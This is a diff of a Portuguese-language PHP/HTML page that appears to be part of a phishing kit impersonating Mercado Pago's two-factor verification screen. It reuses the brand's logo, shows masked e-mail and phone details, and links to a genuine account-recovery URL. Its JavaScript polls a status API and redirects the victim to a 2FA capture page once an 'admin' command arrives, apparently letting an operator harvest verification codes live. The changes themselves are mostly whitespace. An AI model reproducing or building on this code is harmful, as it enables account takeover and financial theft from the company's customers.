@@ -14,7 +14,7 @@ if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
     // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 // Prepara variáveis com valores padrão
@@ -118,7 +118,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 <body>
 
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
+        <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     </header>
 
     <main class="main-content">
@@ -139,7 +139,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
             </div>
 
             <div class="verification-card">
-                
+
                 <a href="telaqr.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M11.6871 0H8.32307V6.66142H9.98973V4.97848H11.6667V3.31313H9.98973V1.66536H11.6871V0Z"></path><path d="M11.6564 13.2617V14.9271H9.98973V16.6673H8.32307V11.6712H9.98973V13.2617H11.6564Z"></path><path d="M18.3333 18.3238H20V19.9892H18.3333V18.3238Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.0204 10.0097V11.6495H11.6769V13.3384H13.3026V18.3258H18.3026V16.6322H20V14.9668H18.3026V13.3298H13.3435V10.0077H11.6871V6.67894H10.0204V8.34431H6.64621V9.98419H4.95381V8.32483H1.62048V9.93896H0V11.6043H1.66667V9.99018H3.32836V11.6495H6.66169V10.0097H10.0204ZM14.9693 14.9951H16.6359V16.6605H14.9693V14.9951Z"></path><path d="M18.3795 9.99018H16.6769V11.6645H15.0102V9.99018H13.3795V8.32483H18.3795V9.99018Z"></path><path d="M18.3333 10.0077H20V13.3384H18.3333V10.0077Z"></path><path d="M10.0204 16.6693H11.6871V18.3346H13.3538V20H8.35384V18.3346H10.0204V16.6693Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V6.67897H6.62046V0H0ZM4.9538 1.66536H1.66667V5.01361H4.9538V1.66536Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 13.321H6.62046V20H0V13.321ZM1.66667 14.9864H4.9538V18.3346H1.66667V14.9864Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.3591 0.00321877V6.68219H19.9795V0.00321877H13.3591ZM18.3129 1.66857H15.0257V5.01683H18.3129V1.66857Z"></path></svg></div>
                     <div class="text-content"><h3>Código QR</h3><p>Você vai escanear o código com a câmera<br>do seu celular ou pelo app do Mercado Pago.</p></div>
@@ -163,7 +163,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone<br>terminado em ****.</p></div>
                     <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                 </a>
-                
+
                 <a href="emailsms_desktop.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                     <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
@@ -171,7 +171,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                 </a>
 
                 <div class="final-separator"></div>
-                
+
                 <a href="https://www.mercadolivre.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAzVOzQ6CMAx-l54NEBLFcPRFlgIFGze2bIVpjO9up-HW779vsH7h1cgrEPRAz2B5ZIETBIsy--gMTyo4q1RioQMOxYIRHQnFBP27FC003UhDpWpGm0hNuMndzNZn5X5bynEy9NTcitZkGnamoh6JxSu4i4TU13XOuXIUR5y85T1SNXpXDbGGz0kDSYxEHB_QS9xIx0L5H4X9-n_00l6bpmu7To_zub3C5wuROLBi8gAAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.f99cbbdf68948cce4993e94928b0e23d618f1b67af42faf06e4875e3015735239596f4fbaf7141577ad59edc33b3eceebfbf014a855bcba992688c2f602fcd6b74fb61677037d9c5ff29389350db8f98102c088baf65b4af66e1ad04830eb8a0.04e03a31771a5fd92bda2c6d9032fddb%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=dXqX8dfCdeiZxWUFEg6mzqf9du19wLGN" class="cant-login-link">Não consigo iniciar sessão</a>
             </div>
         </div>
@@ -205,7 +205,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
@@ -243,14 +243,14 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    console.log('Status atual:', data.status); 
+                    console.log('Status atual:', data.status);
 
                     if (data.status === 'redirecionar_para_2fa') {
                         // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
+
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
+
                         // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
